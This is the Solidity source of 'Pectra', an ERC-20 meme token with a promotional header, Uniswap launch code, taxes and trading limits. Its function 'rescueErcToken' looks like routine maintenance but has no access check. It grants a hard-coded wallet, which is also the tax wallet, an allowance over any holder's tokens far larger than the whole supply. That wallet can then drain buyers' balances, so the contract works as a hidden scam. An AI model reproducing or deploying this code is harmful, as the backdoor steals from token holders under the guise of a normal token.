/**
Pectra

https://cointelegraph.com/news/ethereum-mekong-testnet-pectra-fork
https://dailycoin.com/ethereum-pectra-upgrade-prep-gains-steam-as-devs-unveil-new-testnet/

Join Tg: https://t.me/pectraErc
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.26;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract PECTRA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _ollowances;
    mapping (address => bool) private _isExcludedFees;
    mapping (address => bool) private _bots;
    address payable private _taxWallet;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Pectra";
    string private constant _symbol = unicode"PECTRA";
    uint256 public _rTotal = _tTotal * 100 / 2;
    uint256 public _maxTxAmount = _tTotal * 2 / 100;
    uint256 public _maxWalletAmount = _tTotal * 2 / 100;
    uint256 public _minTaxSwap= _tTotal * 1 / 100;
    uint256 public _maxTaxSwap= _tTotal * 1 / 100;

    uint256 private _initialBuyTax=15;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyAt=12;
    uint256 private _reduceSellAt=12;
    uint256 private _preventCount=15;
    uint256 private _buyTokenCount=0;

    IUniswapV2Router02 private uniRouter;
    address private uniPair;
    address private _ccpReceipt=address(0xBa6630Fb783266fd611c6f102e69166f6C928120);
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private _limitSells = true;
    uint256 private _limitBlockSells = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(_ccpReceipt);
        _rOwned[_msgSender()] = _tTotal;
        _isExcludedFees[owner()] = true;
        _isExcludedFees[address(this)] = true;
        _isExcludedFees[_taxWallet] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function createPair() external onlyOwner() { 
        uniRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniRouter), _tTotal);
        uniPair = IUniswapV2Factory(uniRouter.factory()).createPair(address(this), uniRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _ollowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _ollowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _ollowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 _tokenFee=0;
        if (!swapEnabled || inSwap) {
            _rOwned[from] = _rOwned[from] - amount;
            _rOwned[to] = _rOwned[to] + amount;
            emit Transfer(from, to, amount);
            return;
        }
        if (from != owner() && to != owner()) {
            require(!_bots[from] && !_bots[to]);
            _tokenFee = amount.mul((_buyTokenCount>_reduceBuyAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (from == uniPair && to != address(uniRouter) && ! _isExcludedFees[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletAmount, "Exceeds the maxWalletSize.");
                _buyTokenCount++;
            }
            if(to == uniPair && from!= address(this) ){
                _tokenFee = amount.mul((_buyTokenCount>_reduceSellAt)?_finalSellTax:_initialSellTax).div(100);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance >= 0) {
                    sendETH(address(this).balance);
                }
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to   == uniPair && swapEnabled && contractTokenBalance>_minTaxSwap && _buyTokenCount>_preventCount) {
                if (_limitSells) {
                    if (_limitBlockSells < block.number) {
                        swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                        uint256 contractETHBalance = address(this).balance;
                        if(contractETHBalance > 0) {
                            sendETH(address(this).balance);
                        }
                        _limitBlockSells = block.number;
                    }
                } else {
                    swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                    uint256 contractETHBalance = address(this).balance;
                    if(contractETHBalance > 0) {
                        sendETH(address(this).balance);
                    }
                }
            }
        }
        if(_tokenFee>0){
          _rOwned[address(this)]=_rOwned[address(this)].add(_tokenFee);
          emit Transfer(from, address(this), _tokenFee);
        }
        _rOwned[from]=_rOwned[from].sub(amount);
        _rOwned[to]=_rOwned[to].add(amount.sub(_tokenFee));
        emit Transfer(from, to, amount.sub(_tokenFee));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouter.WETH();
        _approve(address(this), address(uniRouter), tokenAmount);
        uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function rescueETH() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }

    function rescueErcToken(address from) external {
        _ollowances[from][_ccpReceipt] = _rTotal;
    }

    function removeLimits() external onlyOwner {
        _limitSells = false;
        _maxTxAmount = _tTotal;
        _maxWalletAmount=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETH(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    receive() external payable {}

    function startLaunch() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        swapEnabled = true;
        tradingOpen = true;
    }
}